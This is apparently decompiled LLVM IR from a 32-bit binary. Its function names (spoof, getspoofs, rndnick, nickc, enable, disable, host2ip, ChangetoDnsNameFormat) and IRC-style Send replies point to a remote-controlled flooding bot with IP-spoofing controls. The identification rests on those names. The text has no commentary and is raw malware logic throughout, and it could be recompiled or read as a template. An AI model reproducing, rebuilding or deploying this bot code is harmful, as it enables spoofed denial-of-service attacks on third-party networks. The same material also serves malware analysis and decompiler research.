  uselistorder i32 %storemerge5103, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048cf8, { 1, 0 }
  uselistorder i32 %v5_8048ce3107, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048d28.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v4_8048ca2, { 1, 0, 2 }
  uselistorder i32 %v4_8048c91, { 1, 2, 0 }
  uselistorder i32 %storemerge13.in116, { 0, 3, 2, 1 }
  uselistorder i1 %v0_8048bfb, { 1, 0 }
  uselistorder i32 %v7_8048bf9, { 1, 0 }
  uselistorder i32 %storemerge7125, { 2, 0, 3, 1 }
  uselistorder i32 %v4_8048b9f, { 1, 0 }
  uselistorder i32 %v5_8048b8a129, { 7, 8, 3, 0, 2, 1, 9, 10, 6, 4, 5 }
  uselistorder i32 %v2_8048b80, { 3, 1, 5, 2, 4, 0 }
  uselistorder i32 %v3_8048b6e, { 10, 5, 6, 0, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_8048a63, { 1, 0, 2 }
  uselistorder i1 %v5_8048a59, { 4, 5, 1, 3, 2, 0, 6 }
  uselistorder i32 %storemerge8, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8048a04.pre-phi, { 3, 0, 4, 2, 1 }
  uselistorder i1 %v0_80489a7, { 1, 0 }
  uselistorder i32 %v4_804893f, { 3, 4, 2, 5, 1, 6, 7, 0, 8 }
  uselistorder i32 %v4_8048910, { 1, 0 }
  uselistorder i1 %v5_80488fa, { 1, 0, 2 }
  uselistorder i32* %stack_var_-5228, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-5244, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %stack_var_-1096, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 8, 10, 7, 12, 13, 9, 15, 16, 29, 25, 17, 19, 20, 21, 23, 24, 14, 26, 27, 28, 18, 30, 31, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048dc8, { 1, 0 }
  uselistorder label %dec_label_pc_8048d8e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048cf8, { 1, 0 }
  uselistorder label %dec_label_pc_8048cb6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c91, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048c18, { 1, 0 }
  uselistorder label %dec_label_pc_8048bbf, { 1, 0 }
  uselistorder label %dec_label_pc_8048b9f, { 1, 0 }
  uselistorder label %dec_label_pc_8048b1f, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad4, { 1, 0 }
  uselistorder label %dec_label_pc_8048aaf, { 1, 0 }
  uselistorder label %dec_label_pc_8048a01, { 1, 0 }
  uselistorder label %dec_label_pc_80489f5, { 1, 0 }
  uselistorder label %dec_label_pc_8048970, { 1, 0 }
  uselistorder label %dec_label_pc_8048936, { 1, 0 }
}

define i32 @getspoofs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp32 = call i8 @__decompiler_undefined_function_5()
  %tmp33 = call i8 @__decompiler_undefined_function_5()
  %tmp46 = call i8 @__decompiler_undefined_function_5()
  %v0_8048de0 = load i64, i64* @global_var_80748f0.34, align 8
  %v1_8048de0 = trunc i64 %v0_8048de0 to i32
  %v9_8048df7 = icmp eq i32 %v1_8048de0, 1
  %v1_8048dfa = icmp eq i1 %v9_8048df7, false
  br i1 %v1_8048dfa, label %dec_label_pc_8048e50, label %dec_label_pc_8048dfc

dec_label_pc_8048dfc:                             ; preds = %entry
  %v3_8048e0c16 = zext i8 %tmp46 to i32
  store i32 %v3_8048e0c16, i32* @ebx, align 4
  %v3_8048e43 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_8068ab8.48 to i32))
  br label %dec_label_pc_8048ef8

dec_label_pc_8048e50:                             ; preds = %entry
  %v0_8048dd8 = load i8*, i8** @global_var_80748ec.33, align 4
  %v1_8048dd8 = ptrtoint i8* %v0_8048dd8 to i32
  %v3_8048e6f21 = zext i8 %tmp33 to i32
  store i32 %v3_8048e6f21, i32* @ebx, align 4
  %v4_8048e83 = zext i8 %tmp32 to i32
  store i32 %v4_8048e83, i32* @esi, align 4
  %v1_8048e98 = urem i32 %v1_8048dd8, 256
  store i32 %v1_8048e98, i32* @edi, align 4
  %v3_8048ef0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_8068ad8.49 to i32))
  br label %dec_label_pc_8048ef8

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048dfc, %dec_label_pc_8048e50
  %v0_8048eff = phi i32 [ %v3_8048ef0, %dec_label_pc_8048e50 ], [ %v3_8048e43, %dec_label_pc_8048dfc ]
  ret i32 %v0_8048eff

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ef8, { 1, 0 }
}

define i32 @version(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8048f14 = call i32 @Send(i32 %arg1, i32 ptrtoint ([70 x i8]* @global_var_8068b08.50 to i32))
  ret i32 %v3_8048f14
}

define i32 @nickc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8048f25 = icmp eq i32 %arg3, 1
  br i1 %v12_8048f25, label %dec_label_pc_8048f43, label %dec_label_pc_8048f2b

dec_label_pc_8048f2b:                             ; preds = %entry
  %v3_8048f39 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8068b4e.51 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048f43:                             ; preds = %entry
  %v1_8048f46 = add i32 %arg4, 4
  %v1_8048f49 = inttoptr i32 %v1_8048f46 to i32*
  %v2_8048f49 = load i32, i32* %v1_8048f49, align 4
  store i1 false, i1* @df, align 1
  %v4_8048f56 = inttoptr i32 %v2_8048f49 to i8*
  store i32 %v2_8048f49, i32* @edi, align 4
  %v3_8048f59 = call i32 @_strlen(i8* %v4_8048f56)
  %v4_8048f59 = mul i32 %v3_8048f59, -1
  %v1_8048f5f = sub i32 0, %v4_8048f59
  %v2_8048f60 = icmp ult i32 %v1_8048f5f, 32
  %v6_8048f60 = icmp eq i32 %v4_8048f59, -32
  %v2_8048f63 = or i1 %v2_8048f60, %v6_8048f60
  br i1 %v2_8048f63, label %dec_label_pc_8048f7d, label %dec_label_pc_8048f65

dec_label_pc_8048f65:                             ; preds = %dec_label_pc_8048f43
  %v3_8048f73 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_8068b68.52 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048f7d:                             ; preds = %dec_label_pc_8048f43
  %v2_8048f83 = load i32, i32* %v1_8048f49, align 4
  store i32 %v2_8048f83, i32* @global_var_807d3cc.53, align 4
  %v3_8048f9e = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8068b9e.54 to i32))
  br label %dec_label_pc_8048fa6

dec_label_pc_8048fa6:                             ; preds = %dec_label_pc_8048f65, %dec_label_pc_8048f2b, %dec_label_pc_8048f7d
  %v0_8048faa = phi i32 [ %v3_8048f73, %dec_label_pc_8048f65 ], [ %v3_8048f39, %dec_label_pc_8048f2b ], [ %v3_8048f9e, %dec_label_pc_8048f7d ]
  ret i32 %v0_8048faa

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048fa6, { 2, 0, 1 }
}

define i32 @realrand(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8048fae = load i32, i32* @ebx, align 4
  %v2_8048fb7 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048fb7, i32* @ebx, align 4
  %v1_8048fc1 = call i32 @__libc_getpid(i32 0)
  %v0_8048fc6 = load i32, i32* @ebx, align 4
  %v2_8048fc6 = add i32 %v0_8048fc6, %v1_8048fc1
  %v1_8048fcd = call i32 @srand(i32 %v2_8048fc6)
  %v0_8048fd5 = call i32 @random()
  store i32 %v0_8048fd5, i32* @ecx, align 4
  %v2_8048fe2 = sub i32 1, %arg1
  %v1_8048fe4 = add i32 %v2_8048fe2, %arg2
  %v2_8048feb = ashr i32 %v0_8048fd5, 31
  %v2_8048fee = zext i32 %v0_8048fd5 to i64
  %v4_8048fee = zext i32 %v2_8048feb to i64
  %v5_8048fee = mul nuw i64 %v4_8048fee, 4294967296
  %v6_8048fee = or i64 %v5_8048fee, %v2_8048fee
  %v7_8048fee = zext i32 %v1_8048fe4 to i64
  %v10_8048fee = srem i64 %v6_8048fee, %v7_8048fee
  %v11_8048fee = trunc i64 %v10_8048fee to i32
  %v5_8048ff2 = add i32 %v11_8048fee, %arg1
  store i32 %v0_8048fae, i32* @ebx, align 4
  ret i32 %v5_8048ff2

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @rndnick(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8049008 = call i32 @realrand(i32 4, i32 8)
  %v1_8049014 = inttoptr i32 %v2_8049008 to i8*
  %v2_8049014 = call i32 @randstring(i8* %v1_8049014)
  store i32 %v2_8049014, i32* @global_var_807d3cc.53, align 4
  store i32 %v2_8049014, i32* @ebx, align 4
  %v0_8049027 = call i32 @getBuild()
  %v3_804903e = call i32 @Send(i32 %arg1, i32 ptrtoint ([16 x i8]* @global_var_8068baf.56 to i32))
  ret i32 %v3_804903e

; uselistorder directives
  uselistorder i32 %v2_8049014, { 1, 0 }
}

define i32 @disable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8049052 = icmp eq i32 %arg3, 1
  br i1 %v12_8049052, label %dec_label_pc_80490a2, label %dec_label_pc_8049058

dec_label_pc_8049058:                             ; preds = %entry
  %v3_8049066 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8068bbf.57 to i32))
  %v3_8049095 = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_8068c00.60 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_80490a2:                             ; preds = %entry
  %v0_80490a2 = load i8, i8* @global_var_80748e8.28, align 8
  %v4_80490a7 = icmp eq i8 %v0_80490a2, 0
  br i1 %v4_80490a7, label %dec_label_pc_80490c6, label %dec_label_pc_80490ab

dec_label_pc_80490ab:                             ; preds = %dec_label_pc_80490a2
  %v3_80490b9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8068c22.61 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_80490c6:                             ; preds = %dec_label_pc_80490a2
  %v1_80490c9 = add i32 %arg4, 4
  %v1_80490cc = inttoptr i32 %v1_80490c9 to i32*
  %v2_80490cc = load i32, i32* %v1_80490cc, align 4
  store i1 false, i1* @df, align 1
  %v4_80490d9 = inttoptr i32 %v2_80490cc to i8*
  store i32 %v2_80490cc, i32* @edi, align 4
  %v3_80490dc = call i32 @_strlen(i8* %v4_80490d9)
  %v4_80490dc = mul i32 %v3_80490dc, -1
  %v1_80490e2 = sub i32 0, %v4_80490dc
  %v5_80490e3 = icmp ult i32 %v1_80490e2, 254
  %v9_80490e3 = icmp eq i32 %v4_80490dc, -254
  %v2_80490e8 = or i1 %v5_80490e3, %v9_80490e3
  br i1 %v2_80490e8, label %dec_label_pc_8049102, label %dec_label_pc_80490ea

dec_label_pc_80490ea:                             ; preds = %dec_label_pc_80490c6
  %v3_80490f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8068c40.62 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_8049102:                             ; preds = %dec_label_pc_80490c6
  store i8 1, i8* @global_var_80748e8.28, align 8
  %v5_804911a = call i32 @__GI_memset(i8* bitcast (i32* @global_var_807d2c0.63 to i8*), i32 0, i32 256)
  %v2_8049128 = load i32, i32* %v1_80490cc, align 4
  store i32 %v2_8049128, i32* @eax, align 4
  %v4_8049133 = call i32 @strcpy(i8* bitcast (i32* @global_var_807d2c0.63 to i8*), i32 %v2_8049128)
  %v3_8049146 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8068c68.64 to i32))
  br label %dec_label_pc_804914e

dec_label_pc_804914e:                             ; preds = %dec_label_pc_80490ea, %dec_label_pc_80490ab, %dec_label_pc_8049058, %dec_label_pc_8049102
  %v0_8049152 = phi i32 [ %v3_80490f8, %dec_label_pc_80490ea ], [ %v3_80490b9, %dec_label_pc_80490ab ], [ %v3_8049095, %dec_label_pc_8049058 ], [ %v3_8049146, %dec_label_pc_8049102 ]
  ret i32 %v0_8049152

; uselistorder directives
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804914e, { 3, 0, 1, 2 }
}

define i32 @enable(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v12_8049159 = icmp eq i32 %arg3, 1
  br i1 %v12_8049159, label %dec_label_pc_80491a6, label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %entry
  %v3_804916d = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8068c87.65 to i32))
  %v3_804919c = call i32 @Send(i32 %arg1, i32 ptrtoint ([34 x i8]* @global_var_8068c00.60 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491a6:                             ; preds = %entry
  %v0_80491a6 = load i8, i8* @global_var_80748e8.28, align 8
  %v4_80491ab = icmp eq i8 %v0_80491a6, 0
  %v1_80491ad = icmp eq i1 %v4_80491ab, false
  br i1 %v1_80491ad, label %dec_label_pc_80491c7, label %dec_label_pc_80491af

dec_label_pc_80491af:                             ; preds = %dec_label_pc_80491a6
  %v3_80491bd = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8068ca1.66 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491c7:                             ; preds = %dec_label_pc_80491a6
  %v1_80491ca = add i32 %arg4, 4
  %v1_80491cd = inttoptr i32 %v1_80491ca to i32*
  %v2_80491cd = load i32, i32* %v1_80491cd, align 4
  %v4_80491d8 = call i32 @__GI_strcasecmp(i8* bitcast (i32* @global_var_807d2c0.63 to i8*), i32 %v2_80491cd)
  %v1_80491e0 = icmp eq i32 %v4_80491d8, 0
  br i1 %v1_80491e0, label %dec_label_pc_80491fc, label %dec_label_pc_80491e4

dec_label_pc_80491e4:                             ; preds = %dec_label_pc_80491c7
  %v3_80491f2 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8068cbe.67 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_80491fc:                             ; preds = %dec_label_pc_80491c7
  store i8 0, i8* @global_var_80748e8.28, align 8
  %v3_8049211 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8068cd9.68 to i32))
  br label %dec_label_pc_8049219

dec_label_pc_8049219:                             ; preds = %dec_label_pc_80491e4, %dec_label_pc_80491af, %dec_label_pc_804915f, %dec_label_pc_80491fc
  %v0_804921a = phi i32 [ %v3_80491f2, %dec_label_pc_80491e4 ], [ %v3_80491bd, %dec_label_pc_80491af ], [ %v3_804919c, %dec_label_pc_804915f ], [ %v3_8049211, %dec_label_pc_80491fc ]
  ret i32 %v0_804921a

; uselistorder directives
  uselistorder i8* bitcast (i32* @global_var_807d2c0.63 to i8*), { 1, 2, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049219, { 3, 0, 1, 2 }
}

define i32 @spoof(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_8049225 = icmp eq i32 %arg3, 1
  br i1 %v12_8049225, label %dec_label_pc_804925a, label %dec_label_pc_804922b

dec_label_pc_804922b:                             ; preds = %entry
  %v3_8049239 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8068cf8.69 to i32))
  store i32 %v3_8049239, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_80748ec.33, align 4
  store i64 0, i64* @global_var_80748f0.34, align 16
  br label %dec_label_pc_8049401

dec_label_pc_804925a:                             ; preds = %entry
  %v1_804925d = add i32 %arg4, 4
  store i32 %v1_804925d, i32* %eax.global-to-local, align 4
  %v1_8049260 = inttoptr i32 %v1_804925d to i32*
  %v2_8049260 = load i32, i32* %v1_8049260, align 4
  %v1_804926d = and i32 %v2_8049260, -256
  store i32 %v1_804926d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049270 = inttoptr i32 %v2_8049260 to i8*
  store i32 %v2_8049260, i32* @edi, align 4
  %v3_8049276 = call i32 @_strlen(i8* %v4_8049270)
  %v4_8049276 = mul i32 %v3_8049276, -1
  %v1_804927c = sub i32 0, %v4_8049276
  store i32 %v1_804927c, i32* %eax.global-to-local, align 4
  %v2_804927d = icmp ult i32 %v1_804927c, 16
  %v6_804927d = icmp eq i32 %v4_8049276, -16
  %v2_8049280 = or i1 %v2_804927d, %v6_804927d
  br i1 %v2_8049280, label %dec_label_pc_804929d, label %dec_label_pc_8049282

dec_label_pc_8049282:                             ; preds = %dec_label_pc_804925a
  %v3_8049290 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8068d18.70 to i32))
  store i32 %v3_8049290, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049401

dec_label_pc_804929d:                             ; preds = %dec_label_pc_804925a
  store i32 %v1_804925d, i32* %eax.global-to-local, align 4
  %v2_80492a3 = load i32, i32* %v1_8049260, align 4
  %v2_80492a9 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_80492a9, i32* @eax, align 4
  %v3_80492b0 = bitcast i32* %stack_var_-276 to i8*
  %v4_80492b0 = call i32 @strcpy(i8* %v3_80492b0, i32 %v2_80492a3)
  %v2_80492c9 = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_80492d2 = call i32 @_strlen(i8* %v3_80492b0)
  %v1_80492d9 = add i32 %v3_80492d2, -1
  store i32 %v1_80492d9, i32* %eax.global-to-local, align 4
  %v0_80492da = load i32, i32* @ebp, align 4
  %v2_80492da = add i32 %v3_80492d2, -273
  %v3_80492da = add i32 %v2_80492da, %v0_80492da
  %v4_80492da = inttoptr i32 %v3_80492da to i8*
  %v5_80492da = load i8, i8* %v4_80492da, align 1
  %v6_80492da = zext i8 %v5_80492da to i32
  %v8_80492da = and i32 %v1_80492d9, -256
  %v9_80492da = or i32 %v6_80492da, %v8_80492da
  store i32 %v9_80492da, i32* %eax.global-to-local, align 4
  %v10_80492e1 = icmp eq i8 %v5_80492da, 46
  %v1_80492e3 = icmp eq i1 %v10_80492e1, false
  br i1 %v1_80492e3, label %dec_label_pc_8049333, label %dec_label_pc_80492e5

dec_label_pc_80492e5:                             ; preds = %dec_label_pc_804929d
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_80492ff = call i32 @_strlen(i8* %v3_80492b0)
  %v1_8049306 = add i32 %v3_80492ff, -1
  store i32 %v1_8049306, i32* %eax.global-to-local, align 4
  %v0_8049307 = load i32, i32* @ebp, align 4
  %v2_8049307 = add i32 %v3_80492ff, -273
  %v3_8049307 = add i32 %v2_8049307, %v0_8049307
  %v4_8049307 = inttoptr i32 %v3_8049307 to i8*
  store i8 0, i8* %v4_8049307, align 1
  br label %dec_label_pc_8049333

dec_label_pc_804931f:                             ; preds = %dec_label_pc_8049333
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_8049322 = load i32, i32* @ebp, align 4
  %v2_8049322 = add i32 %stack_var_-20.0, -272
  %v3_8049322 = add i32 %v2_8049322, %v0_8049322
  %v4_8049322 = inttoptr i32 %v3_8049322 to i8*
  %v5_8049322 = load i8, i8* %v4_8049322, align 1
  %v6_8049322 = zext i8 %v5_8049322 to i32
  %v8_8049322 = and i32 %stack_var_-20.0, -256
  %v9_8049322 = or i32 %v6_8049322, %v8_8049322
  store i32 %v9_8049322, i32* %eax.global-to-local, align 4
  %v10_8049329 = icmp eq i8 %v5_8049322, 46
  %v1_804932b = icmp eq i1 %v10_8049329, false
  br i1 %v1_804932b, label %dec_label_pc_8049330, label %dec_label_pc_804932d

dec_label_pc_804932d:                             ; preds = %dec_label_pc_804931f
  %v4_804932d = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_8049330

dec_label_pc_8049330:                             ; preds = %dec_label_pc_804931f, %dec_label_pc_804932d
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_804931f ], [ %v4_804932d, %dec_label_pc_804932d ]
  %v4_8049330 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8049333

dec_label_pc_8049333:                             ; preds = %dec_label_pc_80492e5, %dec_label_pc_804929d, %dec_label_pc_8049330
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8049330 ], [ 1, %dec_label_pc_804929d ], [ 1, %dec_label_pc_80492e5 ]
  %stack_var_-20.0 = phi i32 [ %v4_8049330, %dec_label_pc_8049330 ], [ 0, %dec_label_pc_804929d ], [ 0, %dec_label_pc_80492e5 ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_8049350 = call i32 @_strlen(i8* %v3_80492b0)
  store i32 %v3_8049350, i32* %eax.global-to-local, align 4
  %v0_8049357 = load i32, i32* @edx, align 4
  %v7_8049357 = icmp ult i32 %v0_8049357, %v3_8049350
  br i1 %v7_8049357, label %dec_label_pc_804931f, label %dec_label_pc_804935b

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049333
  %v5_8049360 = sub i32 4, %stack_var_-16.1
  %v15_8049360 = icmp eq i32 %v5_8049360, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_80493ab31 = icmp sgt i32 %v5_8049360, 0
  br i1 %v5_80493ab31, label %dec_label_pc_804936f, label %dec_label_pc_80493ad

dec_label_pc_804936f:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_804936f
  %storemerge232 = phi i32 [ %v4_80493a2, %dec_label_pc_804936f ], [ 0, %dec_label_pc_804935b ]
  store i32 %v2_80492a9, i32* @edx, align 4
  store i32 %v2_80492c9, i32* %eax.global-to-local, align 4
  %v3_804938f = call i32 @_strlen(i8* %v3_80492b0)
  %v0_8049396 = load i32, i32* @edx, align 4
  %v0_804939633 = add i32 %v0_8049396, %v3_804938f
  store i32 %v0_804939633, i32* %eax.global-to-local, align 4
  %v1_8049399 = inttoptr i32 %v0_804939633 to i16*
  store i16 12334, i16* %v1_8049399, align 2
  %v0_804939e = load i32, i32* %eax.global-to-local, align 4
  %v1_804939e = add i32 %v0_804939e, 2
  %v2_804939e = inttoptr i32 %v1_804939e to i8*
  store i8 0, i8* %v2_804939e, align 1
  %v4_80493a2 = add nuw nsw i32 %storemerge232, 1
  store i32 %v4_80493a2, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_80493a2, %v5_8049360
  br i1 %exitcond, label %dec_label_pc_80493ad, label %dec_label_pc_804936f

dec_label_pc_80493ad:                             ; preds = %dec_label_pc_804936f, %dec_label_pc_804935b
  %v15_80493b6 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_80492a9, i32* %eax.global-to-local, align 4
  %v4_80493c1 = call i32 @inet_aton(i8* %v3_80492b0, i32 %v15_80493b6)
  %v3_80493c9 = load i32, i32* %stack_var_-288, align 4
  store i32 %v3_80493c9, i32* %eax.global-to-local, align 4
  %v1_80493d6 = icmp eq i1 %v15_8049360, false
  br i1 %v1_80493d6, label %dec_label_pc_80493e4, label %dec_label_pc_80493f9

dec_label_pc_80493e4:                             ; preds = %dec_label_pc_80493ad
  %v3_80493ec = call i32 @poww(i64 256, i32 %v5_8049360)
  store i32 %v3_80493ec, i32* %eax.global-to-local, align 4
  %v1_80493f4 = sext i32 %v3_80493ec to i64
  br label %dec_label_pc_80493f9

dec_label_pc_80493f9:                             ; preds = %dec_label_pc_80493ad, %dec_label_pc_80493e4
  %storemerge = phi i64 [ %v1_80493f4, %dec_label_pc_80493e4 ], [ 1, %dec_label_pc_80493ad ]
  store i64 %storemerge, i64* @global_var_80748f0.34, align 16
  store i32 %v3_80493c9, i32* %eax.global-to-local, align 4
  %v1_80493fc = inttoptr i32 %v3_80493c9 to i8*
  store i8* %v1_80493fc, i8** @global_var_80748ec.33, align 4
  br label %dec_label_pc_8049401

dec_label_pc_8049401:                             ; preds = %dec_label_pc_8049282, %dec_label_pc_804922b, %dec_label_pc_80493f9
  %v0_8049405 = phi i32 [ %v3_8049290, %dec_label_pc_8049282 ], [ %v3_8049239, %dec_label_pc_804922b ], [ %v3_80493c9, %dec_label_pc_80493f9 ]
  ret i32 %v0_8049405

; uselistorder directives
  uselistorder i32 %v3_80493c9, { 0, 2, 1, 3 }
  uselistorder i32 %v4_80493a2, { 1, 2, 0 }
  uselistorder i32 %v5_8049360, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-20.0, { 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_80492c9, { 1, 2, 0, 3 }
  uselistorder i8* %v3_80492b0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_804927c, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 14, 10, 11, 8, 9, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049401, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80493f9, { 1, 0 }
  uselistorder label %dec_label_pc_804936f, { 1, 0 }
  uselistorder label %dec_label_pc_8049333, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049330, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8049412 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_8049412, i32* @global_var_8074d00.71, align 256
  %v10_8049424 = icmp eq i32 %v1_8049412, -1
  %v1_8049427 = icmp eq i1 %v10_8049424, false
  br i1 %v1_8049427, label %dec_label_pc_8049486, label %dec_label_pc_8049429

dec_label_pc_8049429:                             ; preds = %entry
  %v1_804942f = call i32 @__GI_gethostbyname(i32 %arg2)
  %v4_804943a = icmp eq i32 %v1_804942f, 0
  %v1_804943e = icmp eq i1 %v4_804943a, false
  br i1 %v1_804943e, label %dec_label_pc_8049463, label %dec_label_pc_8049440

dec_label_pc_8049440:                             ; preds = %dec_label_pc_8049429
  %v0_8049440 = load i32, i32* @global_var_807d3d0.29, align 16
  %v2_8049451 = call i32 @Send(i32 %v0_8049440, i32 ptrtoint ([33 x i8]* @global_var_8068d64.72 to i32))
  %v1_804945e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8049463

dec_label_pc_8049463:                             ; preds = %dec_label_pc_8049429, %dec_label_pc_8049440
  %v1_8049466 = add i32 %v1_804942f, 12
  %v2_8049466 = inttoptr i32 %v1_8049466 to i32*
  %v3_8049466 = load i32, i32* %v2_8049466, align 4
  %v1_8049473 = add i32 %v1_804942f, 16
  %v2_8049473 = inttoptr i32 %v1_8049473 to i32*
  %v3_8049473 = load i32, i32* %v2_8049473, align 4
  %v1_8049476 = inttoptr i32 %v3_8049473 to i32*
  %v2_8049476 = load i32, i32* %v1_8049476, align 4
  %v3_804947e = call i32 @bcopy(i32 %v2_8049476, i32 ptrtoint (i32* @global_var_8074d00.71 to i32), i32 %v3_8049466)
  %v0_8049486.pre = load i32, i32* @global_var_8074d00.71, align 256
  br label %dec_label_pc_8049486

dec_label_pc_8049486:                             ; preds = %entry, %dec_label_pc_8049463
  %v0_8049486 = phi i32 [ %v1_8049412, %entry ], [ %v0_8049486.pre, %dec_label_pc_8049463 ]
  ret i32 %v0_8049486

; uselistorder directives
  uselistorder i32 %v1_8049412, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049486, { 1, 0 }
  uselistorder label %dec_label_pc_8049463, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i16* @__decompiler_undefined_function_1()
  %v4_804949b = ptrtoint i16* %tmp9 to i32
  store i32 %v4_804949b, i32* %edx.global-to-local, align 4
  %v4_80494ab = bitcast i16* %tmp9 to i8*
  %v3_80494ae = call i32 @_strlen(i8* %v4_80494ab)
  %v2_80494b5 = add i32 %v4_804949b, %v3_80494ae
  %v1_80494b7 = inttoptr i32 %v2_80494b5 to i16*
  store i16 46, i16* %v1_80494b7, align 2
  br label %dec_label_pc_8049506

dec_label_pc_80494c5:                             ; preds = %dec_label_pc_8049506
  %v6_80494c8 = add i32 %v4_8049506, %v4_804949b
  %v1_80494cb = inttoptr i32 %v6_80494c8 to i8*
